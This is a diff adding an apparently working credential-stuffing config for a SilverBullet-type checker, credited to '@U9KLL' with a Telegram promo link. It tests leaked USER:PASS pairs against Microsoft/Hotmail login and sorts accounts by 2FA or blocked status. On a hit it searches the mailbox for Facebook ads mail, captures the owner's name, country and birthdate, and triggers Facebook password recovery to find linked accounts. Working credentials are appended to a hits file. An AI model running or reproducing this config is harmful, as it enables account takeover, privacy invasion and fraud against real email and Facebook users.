@@ -1,0 +1,444 @@
+[SETTINGS]
+{
+  "Name": "Hotmail Ads Code 8 [ Proxyless ] By @U9KLL",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2024-03-02T00:41:44.7141636+03:30",
+  "AdditionalInfo": "JOIN : https://t.me/C0MB0LICT",
+  "RequiredPlugins": [],
+  "Author": "@U9KLL",
+  "Version": "1.1.4 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "JOIN : https://t.me/C0MB0LICT",
+      "VariableName": "",
+      "Id": 375156203
+    }
+  ],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "Hotmail Ads Code 8 By @U9KLL",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+#US FUNCTION Constant "<USER>" -> CAP "US" 
+
+#PS FUNCTION Constant "<PASS>" -> CAP "PS" 
+
+#USER_CHECK REQUEST GET "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint=<USER>&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&mkt=en&response_type=code&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access" 
+  
+  HEADER "Host: outlook.live.com" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Linux; Android 9; V2218A Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "x-requested-with: com.microsoft.outlooklite" 
+  HEADER "sec-fetch-site: none" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-user: ?1" 
+  HEADER "sec-fetch-dest: document" 
+  HEADER "accept-encoding: gzip, deflate" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+
+#USER_CHECK KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "IfExistsResult\":0" 
+    KEY "IfExistsResult\":2" 
+  KEYCHAIN Failure OR 
+    KEY "IfExistsResult\":1" 
+    KEY "{\"ErrorHR\":\"80041103\"}" 
+    KEY "{\"ErrorHR\":\"8004835D\"}" 
+
+#PPFT PARSE "<SOURCE>" LR "name=\"PPFT\" id=\"i0327\" value=\"" "\"" EncodeOutput=TRUE -> VAR "PPFT" 
+
+#PL PARSE "<SOURCE>" LR "urlPost:'" "'" -> VAR "PL" 
+
+#LEN FUNCTION Length "i13=1&login=<USER>&loginfmt=<USER>&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=<PASS>&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=<PPFT>&PPSX=Passport&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=3772" -> VAR "LEN" 
+
+#PASS_CHECK REQUEST POST "<PL>" AutoRedirect=FALSE 
+  CONTENT "i13=1&login=<USER>&loginfmt=<USER>&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=<PASS>&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=<PPFT>&PPSX=Passport&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=3772" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 9; V2218A Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36 PKeyAuth/1.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Host: login.live.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: <LEN>" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Origin: https://login.live.com" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "X-Requested-With: com.microsoft.outlooklite" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Referer: <ADDRESS>" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Cookie: MSPRequ=<COKIES(MSPRequ)>; uaid=<COOKES(uaid)>; MSPOK=<COOKIES(MSPOK)>; OParams=<COOKIES(OParams)>" 
+
+#ERRORS FUNCTION CountOccurrences "error" "<SOURCE>" -> VAR "ERRORS" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "<COOKIES{*}>" Contains "JSH" 
+    KEY "<COOKIES{*}>" Contains "JSHP" 
+    KEY "action=\"https://account.live.com/Consent/Update" 
+    KEY "<ADDRESS>" Contains "https://login.live.com/oauth20_desktop.srf?" 
+  KEYCHAIN Custom "VALID" OR 
+    KEY "/Consent" 
+  KEYCHAIN Failure OR 
+    KEY "account or password is incorrect" 
+    KEY "<ERRORS>" GreaterThan "0" 
+  KEYCHAIN Custom "CAN BYPASS" OR 
+    KEY "https://account.live.com/identity/confirm" 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "https://account.live.com/recover" 
+  KEYCHAIN Custom "BLOCKED" OR 
+    KEY "https://account.live.com/Abuse" 
+    KEY "<ADDRESS>" Contains "https://login.live.com/finisherror.srf" 
+  KEYCHAIN Ban OR 
+    KEY "too many times with" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "<COOKIES{*}>" Contains "JSH" 
+    KEY "<COOKIES{*}>" Contains "JSHP" 
+    KEY "action=\"https://account.live.com/Consent/Update" 
+    KEY "<ADDRESS>" Contains "https://login.live.com/oauth20_desktop.srf?" 
+  KEYCHAIN Failure OR 
+    KEY "account or password is incorrect" 
+    KEY "<ERRORS>" GreaterThan "0" 
+  KEYCHAIN Custom "CAN BYPASS" OR 
+    KEY "https://account.live.com/identity/confirm" 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "https://account.live.com/recover" 
+  KEYCHAIN Custom "BLOCKED" OR 
+    KEY "https://account.live.com/Abuse" 
+    KEY "<ADDRESS>" Contains "https://login.live.com/finisherror.srf" 
+  KEYCHAIN Ban OR 
+    KEY "too many times with" 
+  KEYCHAIN Failure OR 
+    KEY "<ERRORS>" GreaterThan "0" 
+
+IF "<SOURCE>" Contains "/cancel?mkt"
+
+#OPT PARSE "<SOURCE>" LR "opidt%3d" "\"" -> VAR "OPT" 
+
+#OP PARSE "<SOURCE>" LR "opid%3d" "%26" -> VAR "OP" 
+
+#ID PARSE "<SOURCE>" LR "ame=\"uaid\" id=\"uaid\" value=\"" "\"" -> VAR "ID" 
+
+#CANCEL_CHECK REQUEST GET "https://login.live.com/oauth20_authorize.srf?uaid=<ID>&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&opid=<OP>&mkt=EN-US&opidt=<OPT>&res=success&route=C105_BAY" AutoRedirect=FALSE 
+  
+  HEADER "Host: login.live.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 9; V2218A Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36 PKeyAuth/1.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "X-Requested-With: com.microsoft.outlooklite" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Referer: https://account.live.com/" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Cookie: __Host-MSAAUTHP=<COOKIES(__Host-MSAAUTHP)>; PPLState=1; MSPPre=<COOKIES(MSPPre)>; MSPCID=<COOKIES(MSPCID)>; MSPVis=<COOKIES(MSPVis)>; OParams=<COOKIES(OParams)>; MSPBack=<COOKIES(MSPBack)>; mkt=en-US; mkt1=en-US" 
+
+ENDIF
+
+#CODE PARSE "<HEADERS(Location)>" LR "code=" "&" -> VAR "CODE" 
+
+#Info REQUEST GET "https://substrate.office.com/profileb2/v2.0/me/V1Profile" 
+  
+  HEADER "User-Agent: Outlook-Android/2.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json" 
+  HEADER "ForceSync: false" 
+  HEADER "Authorization: Bearer <AUTH>" 
+  HEADER "X-AnchorMailbox: CID:<CID>" 
+  HEADER "Host: substrate.office.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+
+#Country PARSE "<SOURCE>" JSON "location" CreateEmpty=FALSE -> CAP "Country" 
+
+#Name PARSE "<SOURCE>" JSON "displayName" CreateEmpty=FALSE -> CAP "Name" 
+
+#BD PARSE "<SOURCE>" JSON "birthDay" -> VAR "BD" 
+
+#BM PARSE "<SOURCE>" JSON "birthMonth" -> VAR "BM" 
+
+#BY PARSE "<SOURCE>" JSON "birthYear" -> VAR "BY" 
+
+#Birth FUNCTION Constant "<BY>-<BM>-<BD>" -> CAP "Birthdate" 
+
+#GET_AUTH REQUEST POST "https://login.microsoftonline.com/consumers/oauth2/v2.0/token" 
+  CONTENT "client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code=<CODE>&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "return-client-request-id: false" 
+  HEADER "User-Agent: Mozilla/5.0 (compatible; MSAL 1.0)" 
+  HEADER "Host: login.microsoftonline.com" 
+  HEADER "x-client-Ver: 1.0.0+635e350c" 
+  HEADER "x-client-OS: 28" 
+  HEADER "x-client-SKU: MSAL.xplat.android" 
+  HEADER "Content-Type: application/x-www-form-urlencoded; charset=utf-8" 
+  HEADER "Content-Length: 323" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+
+#CI PARSE "<COOKIES(MSPCID)>" LR "" "" -> VAR "CI" 
+
+#CID FUNCTION ToUppercase "<CI>" -> VAR "CID" 
+
+#AUTH PARSE "<SOURCE>" JSON "access_token" -> VAR "AUTH" 
+
+#SEARCH REQUEST POST "https://outlook.live.com/search/api/v2/query?n=43&cri=7ed39d2b-eb78-65d7-a0a2-b9b0b479bbb7&cv=45DCb42FoaTWSZba4RLnqh.43" 
+  CONTENT "{\"Cvid\":\"3333b5c3-7a67-d0d5-5e1e-4039a9028b75\",\"LogicalId\":\"14d044ed-3d7e-40a8-49a9-23a2731e1db9\",\"EntityRequests\":[{\"EntityType\":\"Message\",\"ContentSources\":[\"Exchange\"],\"Query\":{\"QueryString\":\"advertise-noreply@support.facebook.com\"},\"From\":0,\"Size\":250,\"Filter\":{\"Or\":[{\"Term\":{\"DistinguishedFolderName\":\"msgfolderroot\"}},{\"Term\":{\"DistinguishedFolderName\":\"DeletedItems\"}}]}}],\"Scenario\":{\"Name\":\"owa.react.mini\"},\"TimeZone\":\"UTC\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Outlook-Android/2.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json" 
+  HEADER "ForceSync: false" 
+  HEADER "x-search-griffin-version: GWSv2" 
+  HEADER "Authorization: Bearer <AUTH>" 
+  HEADER "X-AnchorMailbox: CID:<CID>" 
+  HEADER "Host: substrate.office.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+  HEADER "prefer: exchange.behavior=\"IncludeThirdPartyOnlineMeetingProviders\"" 
+  HEADER "x-anchormailbox: <USER>" 
+  HEADER "x-ms-appname: owa-reactmail" 
+  HEADER "x-routingparameter-sessionkey: SMTP:<USER>" 
+
+PARSE "<SOURCE>" JSON "Total" CreateEmpty=FALSE -> CAP "Total FB ADS" "[" "]" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "Empty" OR 
+    KEY "<Total FB ADS>" Contains "[0]" 
+
+#GET REQUEST GET "https://m.facebook.com/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER ": scheme: https" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "accewwwcoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9,en;q=0.8,en-GB;q=0.7" 
+  HEADER "cache-control: max-age=0" 
+  HEADER "content-length: 91" 
+  HEADER "content-type: application/x-www-form-urlencoded" 
+  HEADER "origin: https://m.facebook.com" 
+  HEADER "referer: https://m.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fm.facebook.com%2F%3Flocale%3Dar_AR&multiple_results=0&ars=facebook_login&from_login_screen=0&lwv=100&locale2=ar_AR&_rdr" 
+  HEADER "sec-ch-ua: \"Not_A Brand\";v=\"99\", \"Google Chrome\";v=\"109\", \"Chromium\";v=\"109\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: document" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "sec-fetch-user: ?1" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36" 
+
+#LSD PARSE "<SOURCE>" LR "lsd\" value=\"" "\"" -> VAR "LSD" 
+
+#HSI PARSE "<SOURCE>" LR "hsi\":\"" "\"" -> VAR "HSI" 
+
+#SPIN_R PARSE "<SOURCE>" LR "__spin_r\":" ",\"" -> VAR "R" 
+
+#T PARSE "<SOURCE>" LR "__spin_t\":" ",\"" -> VAR "T" 
+
+#REV PARSE "<SOURCE>" LR "server_revision\":" ",\"" -> VAR "REV" 
+
+#JAZ PARSE "<SOURCE>" LR "name=\"jazoest\" value=\"" "\"" -> VAR "JAZ" 
+
+#CHECK REQUEST POST "https://www.facebook.com/ajax/login/help/identify.php?ctx=recover" 
+  CONTENT "jazoest=<JAZ>&lsd=<LSD>&email=<USER>&did_submit=1&__user=0&__a=1&__dyn=7xeUmwkHg7ebwKBWo5O12wAxu13wqovzEdEc8uxa0CEbo1nEhwem0nCq1ewcG0KEswaq0yE1Vrzo5-0ha2l0Fwwwi831wnEfovw8O4U2zxe3C0D85a2W2K0zE5W0HUvw4JwJwSyES0gq0Lo4K2e1FwbO1pw&__csr=&__req=6&__hs=19433.BP%3ADEFAULT.2.0..0.0&dpr=1&__ccg=GOOD&__rev=<REV>&__s=wlfgvi%3Azyax7w%3A2261op&__hsi=<HSI>&__comet_req=0&__spin_r=<R>&__spin_b=trunk&__spin_t=<T>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER ": scheme: https" 
+  HEADER "accept: */*" 
+  HEADER "accewwwcoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9,en;q=0.8,en-GB;q=0.7" 
+  HEADER "content-length: 452" 
+  HEADER "content-type: application/x-www-form-urlencoded" 
+  HEADER "cookie: datr=y3ITZBWQpSJAyamkrULR93BA; sb=y3ITZKdf48Ql4UdzFOZBKFdN; m_pixel_ratio=1; fr=0U0CfcOUu8Zc0z7Jh..BkE3LL.17.AAA.0.0.BkFMO9.AWX_xmxIwNs; wd=809x657" 
+  HEADER "origin: https://www.facebook.com" 
+  HEADER "referer: https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0" 
+  HEADER "sec-ch-ua: \"Not_A Brand\";v=\"99\", \"Google Chrome\";v=\"109\", \"Chromium\";v=\"109\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36" 
+  HEADER "x-asbd-id: 198387" 
+  HEADER "x-fb-lsd: <LSD>" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<COOKIES(sfiu)>" Exists 
+  KEYCHAIN Custom "NOT LINKED TO FB" OR 
+    KEY "account_search\",false" 
+
+#DT PARSE "<SOURCE>" LR "?ldata=" "\"," -> VAR "DT" 
+
+#sfiu PARSE "<COOKIES(sfiu)>" LR "" "" -> VAR "sfiu" 
+
+REQUEST GET "https://www.facebook.com/recover/initiate/?ldata=<DT>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER ": scheme: https" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "accewwwcoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9,en;q=0.8,en-GB;q=0.7" 
+  HEADER "cookie: sfiu=<sfiu>" 
+  HEADER "referer: https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0" 
+  HEADER "sec-ch-ua: \"Not_A Brand\";v=\"99\", \"Google Chrome\";v=\"109\", \"Chromium\";v=\"109\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: document" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "sec-fetch-user: ?1" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36" 
+
+#ID PARSE "<SOURCE>" LR "penid_provider_id\" value=\"" "\"" -> VAR "ID" 
+
+#SEND_EMAIL REQUEST POST "https://www.facebook.com/ajax/recover/initiate/" 
+  CONTENT "jazoest=<JAZ>&lsd=<LSD>&openid_provider_id=<ID>&openid_provider_name=Google&recover_method=send_email&reset_action=1&__user=0&__a=1&__dyn=7xeUmwkHg7ebwKBWo5O12wAxu13wqovzEdEc8uxa0z8S2S0lW4o3Bw5VCwjE3awbG782Cw8G0umUS1vw4iwBgao884y0Mo5W3S7U2cxe0EUjwVw9O1iwKwHw8W1uwa-7U1bobodEGdw46wbS1bwzwqo2Ywmo&__csr=&__req=7&__hs=19433.BP%3ADEFAULT.2.0..0.0&dpr=1&__ccg=EXCELLENT&__rev=<REV>&__s=j4kwnb%3Azyax7w%3Amlul5r&__hsi=<HSI>&__comet_req=0&__spin_r=<R>&__spin_b=trunk&__spin_t=<T>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER ": scheme: https" 
+  HEADER "accept: */*" 
+  HEADER "accewwwcoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9,en;q=0.8,en-GB;q=0.7" 
+  HEADER "content-length: 520" 
+  HEADER "content-type: application/x-www-form-urlencoded" 
+  HEADER "cookie: sfiu=<sfiu>" 
+  HEADER "origin: https://www.facebook.com" 
+  HEADER "referer: https://www.facebook.com/recover/initiate/?ldata=<DT>" 
+  HEADER "sec-ch-ua: \"Not_A Brand\";v=\"99\", \"Google Chrome\";v=\"109\", \"Chromium\";v=\"109\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36" 
+  HEADER "x-asbd-id: 198387" 
+  HEADER "x-fb-lsd: <LSD>" 
+
+PARSE "<SOURCE>" LR "https:\\/\\/www.facebook.com\\/recover\\/code\\/" "\"" -> VAR "A" 
+
+FUNCTION Unescape "<A>" -> VAR "A" 
+
+FUNCTION URLDecode "<A>" -> VAR "A" 
+
+PARSE "<A>" LR "=" "&" Recursive=TRUE -> VAR "SEND TO" 
+
+FUNCTION Replace ", send_email" "" "<SEND TO>" -> CAP "SEND TO" 
+
+#HASH PARSE "<SOURCE>" LR "hash=" "\"" -> VAR "HASH" 
+
+PARSE "<USER>" LR "" "" -> VAR "B" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<SEND TO>" Contains "<B>" 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "<SEND TO>" DoesNotContain "<B>" 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "Account Disabled" 
+
+#GET REQUEST GET "https://www.facebook.com/recover/code/?em[0]=<USER>&rm=send_email&hash=<HASH>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER ": scheme: https" 
+  HEADER "accept: */*" 
+  HEADER "accewwwcoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9,en;q=0.8,en-GB;q=0.7" 
+  HEADER "content-length: 520" 
+  HEADER "content-type: application/x-www-form-urlencoded" 
+  HEADER "cookie: sfiu=<sfiu>" 
+  HEADER "origin: https://www.facebook.com" 
+  HEADER "referer: https://www.facebook.com/recover/initiate/?ldata=<DT>" 
+  HEADER "sec-ch-ua: \"Not_A Brand\";v=\"99\", \"Google Chrome\";v=\"109\", \"Chromium\";v=\"109\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36" 
+  HEADER "x-asbd-id: 198387" 
+  HEADER "x-fb-lsd: <LSD>" 
+
+PARSE "<SOURCE>" LR "Your code is " " " CreateEmpty=FALSE -> CAP "Code" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "code is 8 numbers" 
+  KEYCHAIN Custom "Code 6" OR 
+    KEY "code is 6 numbers" 
+
+#Make_? FUNCTION Constant "@U9KLL" -> CAP "Make By" 
+
+#SAVE_ UTILITY File "Htmail ads hit By @.txt" Append "<USER>:<PASS>:<Your code is>" -> VAR "Seytan kobs" 
+
